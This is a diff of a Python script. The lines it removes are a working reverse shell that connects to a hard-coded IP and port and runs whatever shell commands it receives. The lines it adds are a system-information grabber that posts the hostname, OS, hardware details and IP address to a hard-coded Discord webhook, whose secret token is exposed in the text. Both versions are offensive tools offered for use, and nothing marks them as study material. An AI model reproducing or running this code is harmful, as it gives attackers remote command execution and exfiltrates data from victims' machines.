@@ -1,46 +1,39 @@
+import platform
+import psutil
+import requests
 import socket
-import subprocess
-import os
 
-HOST = '92.247.214.122'  # Replace with your IP
-PORT = 9876              # Replace with your port
+# Replace with your Discord webhook URL
+WEBHOOK_URL = 'https://discord.com/api/webhooks/1158098275375796405/KzaB30FBeSoBWzpTpOP8HrPPqvJejVe8ZHkTEV72k4cyH2iuz51kPiyM4vZruoxSfuHu'
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect((HOST, PORT))
+def get_system_info():
+    info = {
+        "Hostname": socket.gethostname(),
+        "OS": f"{platform.system()} {platform.release()}",
+        "Architecture": platform.machine(),
+        "Processor": platform.processor(),
+        "CPU Cores": psutil.cpu_count(logical=False),
+        "Logical CPUs": psutil.cpu_count(logical=True),
+        "RAM": f"{round(psutil.virtual_memory().total / (1024 ** 3), 2)} GB",
+        "IP Address": socket.gethostbyname(socket.gethostname()),
+        "Uptime": f"{round(psutil.boot_time() / 3600 / 24, 2)} days (since epoch)"
+    }
+    return info
 
-while True:
-    try:
-        # Get the current working directory
-        cwd = os.getcwd()
-        # Send the current working directory to the client
-        s.send(f"{cwd} > ".encode())
+def format_info(info):
+    return '\n'.join([f"**{key}**: {value}" for key, value in info.items()])
 
-        # Receive command
-        command = s.recv(1024).decode().strip()
-        if command.lower() == "exit":
-            break
+def send_to_discord(content):
+    data = {
+        "content": f"📊 **System Information** 📊\n{content}"
+    }
+    response = requests.post(WEBHOOK_URL, json=data)
+    if response.status_code == 204:
+        print("✅ Message sent successfully.")
+    else:
+        print(f"❌ Failed to send message: {response.status_code}\n{response.text}")
 
-        # Handle 'cd' command
-        if command.startswith("cd "):
-            try:
-                # Change the directory
-                path = command[3:].strip()
-                os.chdir(path)
-                s.send(b"[+] Directory changed successfully.\n")
-            except Exception as e:
-                s.send(f"[-] Error changing directory: {str(e)}\n".encode())
-        else:
-            # Execute the command
-            result = subprocess.run(command, shell=True, capture_output=True, text=True)
-            output = result.stdout + result.stderr
-
-            # Send back the output
-            if output:
-                s.send(output.encode())
-            else:
-                s.send(b"[+] Command executed with no output.\n")
-
-    except Exception as e:
-        s.send(f"[-] Error: {str(e)}\n".encode())
-
-s.close()
+if __name__ == '__main__':
+    system_info = get_system_info()
+    formatted_info = format_info(system_info)
+    send_to_discord(formatted_info)
